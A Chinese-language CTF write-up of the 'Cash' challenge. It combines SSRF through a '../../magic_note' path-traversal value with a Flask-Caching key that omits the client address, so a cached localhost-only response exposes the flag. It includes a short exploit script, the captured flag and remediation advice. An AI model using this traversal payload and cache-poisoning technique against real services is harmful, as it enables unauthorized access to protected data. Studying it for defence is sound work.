# Cash

## 题目简述

应用有一个仅允许本机访问时显示 flag 的 `/magic_note` 路由，并用 Flask-Caching 缓存响应。首页的“检查笔记”功能会根据用户提供的文件名构造静态文件 URL，再由服务端 `requests.get()` 访问本机服务。

漏洞来自 SSRF 路径归一化与缓存键设计的组合：先让服务端以本机身份请求 `/magic_note`，把含 flag 的响应写入共享缓存；再从外部构造相同缓存键，便可在路由检查 `remote_addr` 之前命中被污染的响应。

## 解题过程

缓存键由请求路径、表单参数和 User-Agent 组成，但不包含客户端地址：

```python
def make_cache_key():
    args = request.form
    key = request.path + '?' + urlencode([
        (k, v) for k in sorted(args) for v in sorted(args.getlist(k))
    ])
    key += urlencode([('User-Agent', request.headers['User-Agent'])])
    return key
```

首页收到 POST 后构造：

```python
note_path = url_for("static", filename=f"notes/{note_file}")
r = requests.get(f"{URL}{note_path}")
```

令 `note=../../magic_note`，生成的路径形如 `/static/notes/../../magic_note`。HTTP 客户端归一化 `..` 后实际请求本机的 `/magic_note`。该内部请求来自 `127.0.0.1`，因此路由生成包含 flag 的页面：

```python
if request.remote_addr == "127.0.0.1":
    return render_template("./magic_note.html", result=FLAG)
```

内部请求由仓库锁定的 `requests 2.29.0` 发出，其默认 User-Agent 为 `python-requests/2.29.0`。含 flag 的响应因此缓存于“路径 `/magic_note`、无表单参数、该 User-Agent”对应的键下。外部立即使用相同 User-Agent 请求同一路径，就会直接取得缓存内容。

官方利用可归纳为：

```python
import requests

base = "http://127.0.0.1:5000"

# 触发内部请求并写入带 flag 的缓存项
requests.post(base + "/", data={"note": "../../magic_note"})

# 复用内部 requests 客户端的缓存键
r = requests.get(
    base + "/magic_note",
    headers={"User-Agent": "python-requests/2.29.0"},
)
print(r.text)
```

得到：

```text
shellmates{P0150n1ng_c4Ch3_w17h_55Rf}
```

利用需要在缓存项过期前完成；源码返回的 `CachedResponse` 把该敏感响应的缓存时间设为 50 秒。

## 方法总结

这不是单一 SSRF 或单一缓存投毒，而是两者的权限语义不一致。路由根据源地址决定响应是否敏感，缓存层却没有把源地址或“是否为内部请求”纳入键中，于是高权限响应可以被低权限请求复用。

修复时应禁止用户输入中的路径穿越并避免服务端回连自身；更重要的是，不应缓存依赖客户端身份或源地址的敏感响应。若确有缓存需求，缓存键必须覆盖所有会改变授权结果的属性，并且内部服务身份不能仅由 `remote_addr == 127.0.0.1` 判断。
